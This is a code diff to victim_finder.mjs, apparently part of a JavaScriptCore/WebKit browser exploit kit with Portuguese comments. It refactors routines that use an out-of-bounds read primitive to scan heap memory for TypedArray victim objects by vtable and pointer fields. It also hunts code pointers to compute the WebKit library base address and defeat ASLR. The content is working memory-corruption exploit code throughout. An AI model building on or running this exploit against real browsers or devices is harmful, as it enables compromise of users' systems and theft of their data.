@@ -1,5 +1,6 @@
 // js/victim_finder.mjs
-import { AdvancedInt64 } from './int64.mjs';
+// Importa a classe E a função de verificação de int64.mjs
+import { AdvancedInt64, isAdvancedInt64Object } from './int64.mjs';
 import { log as appLog, PAUSE_LAB, toHexS1 } from './utils.mjs';
 import * as Core from './core_exploit.mjs';
 import { JSC_OFFSETS, OOB_CONFIG, WEBKIT_LIBRARY_INFO, updateOOBConfigFromUI } from './config.mjs';
@@ -13,7 +14,7 @@ const TYPED_ARRAY_MODES = {
 };
 
 let leakedWebKitBaseAddress = null;
-let KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = []; // Preenchido por setLeakedWebKitBaseAddress
+let KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = [];
 
 export function setLeakedWebKitBaseAddress(baseAddrHex) {
     const FNAME_SET_BASE = `${FNAME_BASE}.setLeakedWebKitBaseAddress`;
@@ -24,7 +25,7 @@ export function setLeakedWebKitBaseAddress(baseAddrHex) {
         return;
     }
     try {
-        leakedWebKitBaseAddress = new AdvancedInt64(baseAddrHex);
+        leakedWebKitBaseAddress = new AdvancedInt64(baseAddrHex); // Usa o construtor de AdvancedInt64
         appLog(`Endereço base da WebKit definido para: ${leakedWebKitBaseAddress.toString(true)}`, "good", FNAME_SET_BASE);
         
         KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = (WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS.VTable_Possible_Offsets || []).map(offsetHex =>
@@ -42,14 +43,6 @@ export function setLeakedWebKitBaseAddress(baseAddrHex) {
     }
 }
 
-// Helper para verificar se um objeto parece ser um AdvancedInt64 (duck typing)
-function isAdvancedInt64Like(obj) {
-    return obj && typeof obj.isNullPtr === 'function' &&
-           typeof obj.isNegativeOne === 'function' &&
-           typeof obj.greaterThanOrEqual === 'function' &&
-           typeof obj.equals === 'function' &&
-           typeof obj.toString === 'function';
-}
 
 async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
     let vtable_ptr, m_mode_val, m_length_val, m_vector_ptr, m_buffer_ptr;
@@ -57,12 +50,10 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
     try {
         const vtableReadOffset = currentCandidateBaseRelOffset + (JSC_OFFSETS.TypedArray.VTABLE_OFFSET || 0);
         vtable_ptr = Core.oob_read_relative(vtableReadOffset, 8);
-        // Log de depuração mais robusto
-        logFn(`DEBUG_TA_VTABLE @ ${toHexS1(currentCandidateBaseRelOffset)}: typeof=${typeof vtable_ptr}, isAdvInt64Like=${isAdvancedInt64Like(vtable_ptr)}, val=${vtable_ptr ? vtable_ptr.toString(true) : String(vtable_ptr)}`, 'info', FNAME_BASE);
-
+        // Log de depuração já está em Core.oob_read_relative
 
         let vtableMatch = false;
-        if (leakedWebKitBaseAddress && KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.length > 0 && isAdvancedInt64Like(vtable_ptr)) {
+        if (leakedWebKitBaseAddress && KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.length > 0 && isAdvancedInt64Object(vtable_ptr)) {
             for (const knownVTableAddr of KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES) {
                 if (vtable_ptr.equals(knownVTableAddr)) {
                     vtableMatch = true;
@@ -79,14 +70,13 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
 
         const vectorReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
         m_vector_ptr = Core.oob_read_relative(vectorReadOffset, 8);
-        logFn(`DEBUG_TA_MVECTOR @ ${toHexS1(currentCandidateBaseRelOffset)}: typeof=${typeof m_vector_ptr}, isAdvInt64Like=${isAdvancedInt64Like(m_vector_ptr)}, val=${m_vector_ptr ? m_vector_ptr.toString(true) : String(m_vector_ptr)}`, 'info', FNAME_BASE);
-
+        // Log de depuração já está em Core.oob_read_relative
 
         const typeName = TYPED_ARRAY_MODES[m_mode_val] || null;
         const isLengthPlausible = typeof m_length_val === 'number' && m_length_val > 0 && m_length_val < (1024 * 1024 * 32);
         
-        // ** VERIFICAÇÃO DE MÉTODO REFINADA **
-        const isVectorPlausible = isAdvancedInt64Like(m_vector_ptr) && 
+        // Usa a função importada isAdvancedInt64Object
+        const isVectorPlausible = isAdvancedInt64Object(m_vector_ptr) && 
                                   !m_vector_ptr.isNullPtr() && 
                                   !m_vector_ptr.isNegativeOne() && 
                                   m_vector_ptr.greaterThanOrEqual(new AdvancedInt64(0x1000, 0));
@@ -94,9 +84,9 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
         if (typeName && isLengthPlausible && isVectorPlausible) {
             const bufferPtrReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET;
             m_buffer_ptr = Core.oob_read_relative(bufferPtrReadOffset, 8);
-            logFn(`DEBUG_TA_MBUFFER @ ${toHexS1(currentCandidateBaseRelOffset)}: typeof=${typeof m_buffer_ptr}, isAdvInt64Like=${isAdvancedInt64Like(m_buffer_ptr)}, val=${m_buffer_ptr ? m_buffer_ptr.toString(true) : String(m_buffer_ptr)}`, 'info', FNAME_BASE);
+            // Log de depuração já está em Core.oob_read_relative
 
-            const isBufferPtrPlausible = isAdvancedInt64Like(m_buffer_ptr) &&
+            const isBufferPtrPlausible = isAdvancedInt64Object(m_buffer_ptr) &&
                                          !m_buffer_ptr.isNullPtr() &&
                                          !m_buffer_ptr.isNegativeOne() &&
                                          m_buffer_ptr.greaterThanOrEqual(new AdvancedInt64(0x1000, 0));
@@ -108,7 +98,7 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
                     m_mode: m_mode_val, typeName: typeName, m_length: m_length_val,
                     m_vector_hex: m_vector_ptr.toString(true),
                     m_buffer_hex: m_buffer_ptr.toString(true),
-                    vtable_ptr_hex: (vtable_ptr && typeof vtable_ptr.toString === 'function') ? vtable_ptr.toString(true) : String(vtable_ptr),
+                    vtable_ptr_hex: isAdvancedInt64Object(vtable_ptr) ? vtable_ptr.toString(true) : String(vtable_ptr),
                     vtable_match: vtableMatch
                 };
                 return candidate;
@@ -116,8 +106,7 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
         }
     } catch (e) { 
         if (!(e instanceof RangeError && e.message.toLowerCase().includes("fora dos limites do buffer real"))) {
-            logFn(`Erro informativo durante scanForTypedArrays em ${toHexS1(currentCandidateBaseRelOffset)}: ${e.name} - ${e.message}`, 'info', `${FNAME_BASE}.scanForTypedArrays`);
-            // console.error(`StackTrace para erro em scanForTypedArrays (offset ${toHexS1(currentCandidateBaseRelOffset)}):`, e);
+            logFn(`Erro durante scanForTypedArrays em ${toHexS1(currentCandidateBaseRelOffset)}: ${e.name} - ${e.message}`, 'info', `${FNAME_BASE}.scanForTypedArrays`);
         }
     }
     return null;
@@ -127,12 +116,12 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
     let potentialPtr;
     try {
         potentialPtr = Core.oob_read_relative(currentCandidateBaseRelOffset, 8);
-        logFn(`DEBUG_CP_PTR @ ${toHexS1(currentCandidateBaseRelOffset)}: typeof=${typeof potentialPtr}, isAdvInt64Like=${isAdvancedInt64Like(potentialPtr)}, val=${potentialPtr ? potentialPtr.toString(true) : String(potentialPtr)}`, 'info', FNAME_BASE);
+        // Log de depuração já está em Core.oob_read_relative
 
-        if (isAdvancedInt64Like(potentialPtr) && !potentialPtr.isNullPtr() && !potentialPtr.isNegativeOne()) {
-            if (leakedWebKitBaseAddress) {
-                // ... (lógica de verificação de segmento e função como antes) ...
-                 for (const segment of WEBKIT_LIBRARY_INFO.SEGMENTS) {
+        if (isAdvancedInt64Object(potentialPtr) && !potentialPtr.isNullPtr() && !potentialPtr.isNegativeOne()) {
+            // ... (lógica de verificação de ponteiro de código como antes) ...
+             if (leakedWebKitBaseAddress) {
+                for (const segment of WEBKIT_LIBRARY_INFO.SEGMENTS) {
                     const segStart = leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(segment.vaddr_start_hex));
                     const segEnd = segStart.add(AdvancedInt64.fromHex(segment.memsz_hex));
                     if (potentialPtr.greaterThanOrEqual(segStart) && potentialPtr.lessThan(segEnd)) {
@@ -153,7 +142,7 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
                         };
                     }
                 }
-            } else {
+            } else { // Base da lib não conhecida, tenta calcular
                 for (const [funcName, funcOffsetHex] of Object.entries(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS)) {
                     const funcOffsetInt64 = AdvancedInt64.fromHex(funcOffsetHex);
                     const potentialBaseAddr = potentialPtr.sub(funcOffsetInt64);
@@ -169,17 +158,14 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
         }
     } catch (e) {
         if (!(e instanceof RangeError && e.message.toLowerCase().includes("fora dos limites do buffer real"))) {
-            logFn(`Erro informativo durante scanForCodePointers em ${toHexS1(currentCandidateBaseRelOffset)}: ${e.name} - ${e.message}`, 'info', `${FNAME_BASE}.scanForCodePointers`);
+            logFn(`Erro durante scanForCodePointers em ${toHexS1(currentCandidateBaseRelOffset)}: ${e.name} - ${e.message}`, 'info', `${FNAME_BASE}.scanForCodePointers`);
         }
     }
     return null;
 }
 
-// scanMemory e findVictimButtonHandler permanecem como na versão anterior (v3.5.0),
-// pois as correções são focadas nas sub-funções de scan.
-// Apenas garanta que os logs de DEBUG de scanForTypedArrays e scanForCodePointers
-// sejam passados corretamente (usando appLog como logFn).
-
+// scanMemory e findVictimButtonHandler permanecem como na versão anterior (v3.6.0 - esta seria a v3.7.0),
+// pois as correções são focadas nas sub-funções de scan e na importação/verificação em int64.mjs.
 export async function scanMemory(scanStartRelOffset, scanRangeBytes, stepBytes = 8, scanConfig = {typedArrays: true, codePointers: false}) {
     const FNAME_SCAN = `${FNAME_BASE}.scanMemory`;
     appLog(`--- Iniciando ${FNAME_SCAN} ---`, 'test', FNAME_SCAN);
@@ -224,19 +210,22 @@ export async function scanMemory(scanStartRelOffset, scanRangeBytes, stepBytes =
 
         let foundThisIteration = null;
         if (scanConfig.typedArrays) {
-            const taCandidate = await scanForTypedArrays(currentCandidateBaseRelOffset, appLog); // Passa appLog
+            const taCandidate = await scanForTypedArrays(currentCandidateBaseRelOffset, appLog);
             if (taCandidate) {
                 candidates.push(taCandidate);
                 foundThisIteration = taCandidate;
-                // Logs específicos do candidato TypedArray já são feitos dentro de scanForTypedArrays
+                 if (taCandidate.vtable_match) {
+                     appLog(`   CANDIDATO TYPEDARRAY (VTABLE MATCH!): GAP/OffsetRel: ${toHexS1(taCandidate.gapOrRelativeOffset)}, Tipo: ${taCandidate.typeName}, VTable: ${taCandidate.vtable_ptr_hex}`, 'good', FNAME_SCAN);
+                } else {
+                     appLog(`   Candidato TypedArray Encontrado: GAP/OffsetRel: ${toHexS1(taCandidate.gapOrRelativeOffset)}, Tipo: ${taCandidate.typeName}, VTable Lida: ${taCandidate.vtable_ptr_hex}`, 'leak', FNAME_SCAN);
+                }
             }
         }
         if (scanConfig.codePointers && !foundThisIteration) {
-            const cpCandidate = await scanForCodePointers(currentCandidateBaseRelOffset, appLog); // Passa appLog
+            const cpCandidate = await scanForCodePointers(currentCandidateBaseRelOffset, appLog);
             if (cpCandidate) {
                 candidates.push(cpCandidate);
-                // Logs específicos do candidato CodePointer já são feitos dentro de scanForCodePointers (se encontrar)
-                 appLog(`   CANDIDATO PONTEIRO DE CÓDIGO: OffsetScan ${toHexS1(cpCandidate.gapOrRelativeOffset)}, Ptr: ${cpCandidate.leakedPtrHex}, BaseCalc: ${cpCandidate.calculatedBaseHex} (Função: ${cpCandidate.probableFunction || cpCandidate.knownFunction || cpCandidate.segmentName || 'N/A'})`, 'leak', FNAME_SCAN);
+                appLog(`   CANDIDATO PONTEIRO DE CÓDIGO: OffsetScan ${toHexS1(cpCandidate.gapOrRelativeOffset)}, Ptr: ${cpCandidate.leakedPtrHex}, BaseCalc: ${cpCandidate.calculatedBaseHex} (Função: ${cpCandidate.probableFunction || cpCandidate.knownFunction || cpCandidate.segmentName || 'N/A'})`, 'leak', FNAME_SCAN);
             }
         }
     }
